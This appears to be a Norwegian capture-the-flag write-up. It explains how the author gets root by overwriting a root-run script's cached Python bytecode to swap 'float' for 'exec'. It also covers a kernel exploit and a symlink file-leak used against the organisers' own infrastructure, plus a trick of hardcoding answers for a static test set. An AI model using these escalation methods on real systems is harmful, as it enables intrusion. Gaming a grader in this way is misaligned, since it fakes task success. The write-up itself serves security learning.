Fastulator er en variant av Calculator som har en maksimal grense for antall instruksjoner som kjøres. Her la jeg inn en drøss med optimaliseringer, ved å blant annet trekke fra differansen mellom hvert ASCII-tegn for operatorene, slik at jeg kunne sjekke `/NULL`-registeret uten å måtte kopiere tilbake originalverdien hver gang. Men uansett hvor mye jeg optimaliserte, så fikk jeg ikke oppgaven til å kjøre optimalt nok. Til slutt innså jeg at testsettet var statisk, og at jeg derfor kunne jukse ved å skrive kode som detekterte hvilket testsett som kjørte og servere det korrekte svaret. Slik fant jeg ut at svaret på første, hemmelige test var 0x1188 og den andre inneholder en deling på 0 og skal derfor ha error 2.

#### Hydropower

Kanskje oppgaven jeg brukte mest tid på av utfordringene. Her skal man skrive et program som optimaliserer profitten til et selskap som selger strøm, basert på en bråte med variabler og vurderinger. Man har også et maksimalt antall instruksjoner før man må komme med et svar på hvor mye som skal selges. Resultatet man får sier bare total profitt, bøter og hvor mye vann som rant over. Jeg lekte litt med ulike kodesnutter her, og endte opp med å tjene ca. 6.9 millioner øre - eller 69,000 kroner. Uten å vite hvor langt unna jeg var (10 millioner? 100 millioner?) så la jeg denne oppgaven på is en stund, inntil jeg fikk opplyst at jeg var ganske nærme og burde fortsette.

Løsningen min er veldig brute-force, hvor jeg leser inn inputs og segmenterer programmet i 4-5 ulike sluser som fungerer som grunn-strategier. Jeg brute-forcet de beste grenseverdiene for hver parameter, og så kjørte jeg mikro-optimaliseringer via simulated annealing.

Hovedstrategiene, i prioritert rekkefølge, er:

- Ikke selg hvis vannstanden er under 2005

- Hvis vannstanden er mindre enn 2661, sjekk om det regner og selg litt hvis det gjør det.

- Hvis vannstanden er over 3965, åpne alt maksimalt.

- Hvis strømprisen er mer enn 271, selg maksimalt, ellers ingenting.

#### Beta 1 og 2

> Hvis du føler deg modig kan du prøve beta-versjonen av `/run`-endepunktet!
>  Ytelsen på denne er om mulig enda bedre, takket være at 
> implementasjonen er skrevet på nytt i C av vår dyktige sommervikar.

/beta er forskjellig fra /run på tre ulike vis:

- Dataminnet er ikke uinitialisert, og inneholder diverse strenger, blant annet et flagg. /PEK wrapper heller ikke på 13 bits.

- Stabelen er allerede initialisert med en del mystiske verdier, som viser seg å være et flagg.

- Det finnes en udokumentert opcode 0x42 (mulig denne virker andre steder også).

For å scanne gjennom minnet kan man kjøre et program som

```
.ALIAS i 1
.ALIAS lol 8191
FINNE lol
:loop
LASTE i
UT i
HOPPE loop
```

Og for å lese ut stabel-verdiene, så kan man laste opp et program som utelukkende inneholder "TILBAKE" repetert 2048 ganger, samt skru på trace. Ved å lese ut adressene det hoppes til, og shifte disse et par bits til høyre, så får man ut et flagg.

### 3.2.2 Python CMD handler

#### Intro

For denne oppgaven må vi logge på en ekstern server via SSH. Inne i /cmds finner vi en del filer

```bash
login@python_cmd_handler:/cmds$ ls -la
total 16
drwxrwxrwt 1 root root  31 Dec 15 21:45 .
drwxr-xr-x 1 root root  63 Jan  4 19:08 ..
-rw-r--r-- 1 root root 585 Dec  5 09:18 README.md
-rwxr-xr-x 1 root root 471 Dec 13 14:35 cmd_handler.py
d--------- 1 root root  22 Dec 13 15:54 cmd_handler_stuff
-rwxr-xr-x 1 root root 445 Dec 13 14:35 cmd_handler_stuff.py
-rwxr-xr-x 1 root root 352 Dec  5 09:18 service.sh
```

og `ps` viser at service.sh kjøres i evig loop som root-brukeren.

```bash
#!/bin/bash

check_for_cmds_forever(){
while true
do
    if [ -e /cmds/cmd.txt ];
    then
        # Remove old output files to avoid confusion
        rm /cmds/out.txt

        # Found command - execute it
        python3 /cmds/cmd_handler.py

        # Clean up files we don't need anymore
        rm /cmds/cmd.txt
        rm -r /cmds/__pycache__
    fi
    sleep 10
done
}
```

Selve python-scriptet som kjøres, åpner cmd.txt og passer på at kun gyldige kommandoer blir lastet inn fra den. Disse kjøres, og så får vi output i out.txt.

```python
#!/usr/bin/env python3

import cmd_handler_stuff

cmd_path = "/cmds/cmd.txt"
out_path = "/cmds/out.txt"

try:
    with open(cmd_path) as f:
        cmd, *args = f.read().strip().split('\n')

    assert cmd in cmd_handler_stuff.valid_commands, "Invalid command!"
    assert cmd != "get_flag", "Nice try!"
    output = cmd_handler_stuff.valid_commands[cmd](*args)

except Exception as e:
    output = repr(e)

with open(out_path, "w") as f:
    f.write(str(output) + '\n')
```

`cmd_handler_stuff.py` inneholder en funksjon som leser og skriver ut flagget.

```python
#!/usr/bin/env python3

def add(a, b):
    return float(a) + float(b)

def multiply(a, b):
    return float(a) * float(b)

def divide(a, b):
    return float(a) / float(b)

def greet():
    return "Hello world!"

def get_flag():
    with open("/cmds/cmd_handler_stuff/flag.txt") as f:
        return f.read()

valid_commands = {
    "add": add,
    "multiply": multiply,
    "divide": divide,
    "greet": greet,
    "get_flag": get_flag
}
```

`get_flag` er ulovlig i følge `cmd_handler.py`, så vi får ikke kalt den direkte.

#### Løsning

Når en python-fil importeres, så sjekkes det om filen allerede er cachet i `__pycache__`, og om den originale filen er nyere enn cachen. Om filen er nyere enn cache, så caches filen på nytt, ellers lastes ferdig "kompilert" bytecode fra cachen. Denne kan vi endre!

Den enkleste løsningen er å kjøre

`python3 -c "import cmd_handler_stuff"` for å opprette en cachet versjon av `cmd_handler_stuff`. Deretter overskriver vi denne med kode som gir oss mer kontroll. Jeg valgte å erstatte "float" med "exec", slik at inputs til f.eks. `divide()` ender opp med å kjøres som kode før de deles på hverandre. Unicode-strenger i bytecode er lagret med lengde først, så vi erstatter "\x05float" med "\x04exec". Hele denne prosedyren må gjentas for hver kommando, siden servicen sletter unna pycache.

Her er det trivielt å skaffe seg shell som root, og derfra kan man også finne et "umulig" flagg i `/root`.



## 3.4 Utfordringer umulig

Det var mulig å skaffe seg to flagg via exploits på tjenester, men også privesc inn i infrastrukturen. Scoreboard så derfor litt rart ut mot slutten

![](2023-01-05-13-31-35-image.png)

På oppgave 3.2.2 python_cmd_handler får man enkel root på maskinen via endring av pycache. Ved å bruke symlinks og metode 2 på 2.09 kan man også lure serveren til å servere tilfeldige filer som `c2`-brukeren har tilgang til og sende de til en klient. Ved å peke den mot `/home/c2/FLAGG` så sendes et flagg av gårde, og dette kan vi lese ut i etterkant. Intensjonen med dette flagget var å bevise at man hadde fått shell-access, så det ble senere renamet til noe mer tilfeldig.

Kernelen som kjørte på Corax var

`5.4.0-1094-azure #100~18.04.1-Ubuntu` som er sårbar mot [CVE-2022-42703](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html), men det er ingen fiks-ferdig exploit for denne. På bugtrackeren finner man en poc som gir stack pivot og en ropchain i kernel, men den må skreddersys for Azure-kernelen. Dette er relativt mye jobb, og jeg fikk ganske mye hjelp til å sette opp et eget miljø likt infrastrukturen og teste mot det.

Ved å exploite kernelen får man root på Corax, og derfra er det kort vei til å - forsiktig! - bla seg gjennom infrastrukturen og se etter flere. De aller siste flaggene for 100% completion måtte jeg inn i databasen for å finne, ettersom de ikke var plassert ut noe sted. Etter en sniktitt bak forhenget, må jeg si at det ligger betraktelig mer arbeid bak infrastrukturen enn jeg hadde sett for meg, og det er et imponerende stykke arbeid som ligger bak det å skalere opp og ned og gi alle et separat miljø til å tukle med.



## 4. Skjulte flagg

### 4.1 Askpass

Gjemt inni askpass-programmet man finner i oppdrag 2.07

### 4.2 Corax /dev/shm

Ganske selvforklarende. `cat /dev/shm/.secret`. Denne hintes det til i banneret på talentprogramnettsiden.
